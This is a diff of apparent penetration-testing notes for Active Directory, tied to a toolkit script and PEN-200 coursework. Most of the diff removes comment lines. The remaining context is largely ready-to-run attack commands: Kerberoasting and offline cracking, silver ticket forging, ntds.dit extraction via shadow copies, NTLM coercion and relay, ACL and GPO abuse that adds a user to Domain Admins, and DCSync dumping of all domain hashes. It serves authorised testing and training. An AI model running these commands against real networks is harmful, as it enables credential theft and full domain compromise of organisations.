@@ -227,16 +227,6 @@ The 2025-2026 aligned matrix is still evidence-gated. `adr.sh` does not print la
 # 1. adr.sh collects the zip automatically in phase 6
 ls $TOOLKIT_ROOT/ad/corp.local/bloodhound/*.zip
 
-# 2. next_steps.txt has the import command already:
-#    bloodhound-cli upload --path <zip> --url http://localhost:8080 --username admin --password <pass>
-
-# 3. Or manually: Open BloodHound CE in browser → File Ingest → upload zip
-
-# 4. Mark your current user as Owned
-# 5. Run pre-built queries (next_steps.txt lists these):
-#    - Shortest Path to Domain Admins from Owned Principals
-#    - Find Kerberoastable Users with Path to DA
-#    - Users with DCSync Rights
 #    - ASREPRoastable Users
 ```
 
@@ -260,7 +250,6 @@ ls $TOOLKIT_ROOT/ad/corp.local/bloodhound/*.zip
 ## Troubleshooting
 
 ```bash
-# Credential validation fails (Phase 1 aborts)
 # → verify user/password/hash, check domain name is correct
 nxc smb 10.10.10.5 -u user -p 'Password1' -d corp.local
 
@@ -268,9 +257,6 @@ nxc smb 10.10.10.5 -u user -p 'Password1' -d corp.local
 cat $TOOLKIT_ROOT/ad/corp.local/bloodhound/collection_output.txt
 # Common cause: tool name changed — verify: which bloodhound-ce-python
 pip install bloodhound-ce     # or: sudo apt install bloodhound-ce-python
-
-# LDAP phases skipped with hash auth
-# → expected behavior; use password auth for full LDAP output
 
 # Re-run a specific phase (e.g. BloodHound failed, rest is done)
 ./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --skip-bloodhound
@@ -319,11 +305,8 @@ pip install bloodhound-ce
 
 ## Related
 
-- [[Engagement_Methodology]] — AD set workflow (Phase 9); `orient --domain` bridges adr's output
 - [[Toolkit_Strategy]] — engagement run order; the AD credential loop (§4)
 - [[Active_Directory]] — manual AD attack techniques
-- [[OffSec_AD_Field_Notes]] — engagement AD reference
-- [[OffSec_AD_Mental_Model]] — decision-tree for AD attack paths
 - [[crackr]] — crack the hashes from `hashes/asreproast.txt` and `hashes/kerberoast.txt`
 - [[Active_Directory_PtH_PtT]] — use cracked hashes for lateral movement
 - [[Tunneling_Pivoting]] — pivot to reach internal DC
@@ -423,9 +406,6 @@ certipy auth -pfx administrator.pfx -dc-ip DC_IP
 
 **ACL-based attacks not shown in BloodHound default queries:**
 ```bash
-# Run BloodHound query: "Find Principals with DCSync Rights"
-# Also check: "Find Principals with GenericAll on Computer Objects"
-
 # GenericAll on a user → reset their password
 Set-ADAccountPassword -Identity "targetuser" -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Reset
 # Or via impacket:
@@ -434,8 +414,6 @@ impacket-changepasswd corp.local/youruser:yourpass@DC_IP -altuser targetuser \
 
 # GenericAll on a group → add yourself to it
 Add-ADGroupMember -Identity "Domain Admins" -Members "youruser"
-# Or: net group "Domain Admins" youruser /add /domain
-
 # WriteOwner on an object → take ownership first
 Set-ADObject -Identity "OU=Computers,DC=corp,DC=local" -Replace @{nTSecurityDescriptor=...}
 # Use PowerView for cleaner syntax:
@@ -445,9 +423,6 @@ Grant-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Ri
 
 **Shadow credentials (no LAPS, no password reset):**
 ```bash
-# Requires GenericWrite or GenericAll on a computer/user account
-# python3 pywhisker.py -d corp.local -u user -p pass --target victim_computer$ --action add
-# Creates a certificate → get hash via PKINIT
 # impacket-gettgtpkinit corp.local/victim_computer$ -cert-pfx victim.pfx -pfx-pass pass victim.ccache
 ```
 
@@ -460,7 +435,6 @@ Grant-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Ri
 cewl http://company.com -d 3 -m 5 -w company_words.txt
 hashcat -m 13100 kerberoast.txt company_words.txt -r /usr/share/hashcat/rules/best64.rule
 
-# 2. If you know the service account purpose, try service-specific passwords
 # (e.g., SQL service accounts often use database-related passwords)
 echo -e "SQL2019!\nSQLServer2022\nDb@admin123" > targeted.txt
 hashcat -m 13100 kerberoast.txt targeted.txt
@@ -468,8 +442,6 @@ hashcat -m 13100 kerberoast.txt targeted.txt
 # 3. Request tickets for ALL SPNs then crack offline
 impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request \
   -outputfile all_kerberoast.txt 2>/dev/null
-# Try cracking all of them — some accounts have weaker passwords than others
-
 # 4. Targeted Kerberoasting — ask for RC4 ticket instead of AES
 impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request \
   -usersfile spn_users.txt -etype 23 -outputfile rc4_kerberoast.txt
@@ -495,8 +467,6 @@ impacket-getTGT corp.local/user -hashes :NTHASH -dc-ip DC_IP
 export KRB5CCNAME=user.ccache
 impacket-smbexec -k -no-pass corp.local/user@TARGET_IP
 
-# Silver Ticket — forge a TGS for ONE service using a cracked service account hash.
-# Use this when Kerberoast gave you a SPN-account hash and DCSync/psexec-as-DA is blocked.
 # (PEN-200 ch 23.2.4)
 python3 -c 'from impacket.ntlm import compute_nthash; import sys; print(compute_nthash(sys.argv[1]).hex())' 'CRACKED_PASS'
 impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid DOMAIN_SID -domain corp.local \
@@ -504,8 +474,6 @@ impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid DOMAIN_SID -domain corp.lo
 export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass targethost.corp.local
 
-# Shadow Copies fallback — extract ntds.dit when DCSync is blocked but you have
-# a shell on the DC as local admin. (PEN-200 ch 24.2.2)
 # Run on the DC (cmd as admin):
 vssadmin create shadow /for=C:
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
@@ -531,7 +499,6 @@ python3 PetitPotam.py -u user -p pass KALI_IP DC_IP    # authenticated
 # Coercer — tries multiple coercion methods
 python3 Coercer.py coerce -l KALI_IP -t DC_IP -u user -p pass -d corp.local
 
-# Relay the captured hash to another DC or member server
 # (Works when SMB signing is not required — check signing status with nxc)
 nxc smb TARGETS_FILE -u '' -p '' --gen-relay-list relay_targets.txt
 ntlmrelayx.py -tf relay_targets.txt -smb2support --no-http-server
@@ -542,7 +509,6 @@ ntlmrelayx.py -tf relay_targets.txt -smb2support --no-http-server
 ### GPO Abuse
 
 ```bash
-# Check if your user has rights to modify a GPO (via BloodHound → "Find GPO Misconfigurations")
 # PowerView:
 Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}
 
@@ -558,7 +524,6 @@ Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRi
 ### DCSync (When You Have Replication Rights)
 
 ```bash
-# Check if your account has DCSync rights (BloodHound → "Find Principals with DCSync Rights")
 # If yes:
 impacket-secretsdump corp.local/user:pass@DC_IP       # dumps ALL domain hashes
 impacket-secretsdump corp.local/user:pass@DC_IP -just-dc-user administrator
@@ -566,7 +531,6 @@ impacket-secretsdump corp.local/user:pass@DC_IP -just-dc-user administrator
 # With hash:
 impacket-secretsdump corp.local/user@DC_IP -hashes :NTHASH
 
-# After dump: spray ALL hashes
 # Put NTLM hashes in hashes.txt → ./sprayr.sh --from-creds
 ```
 
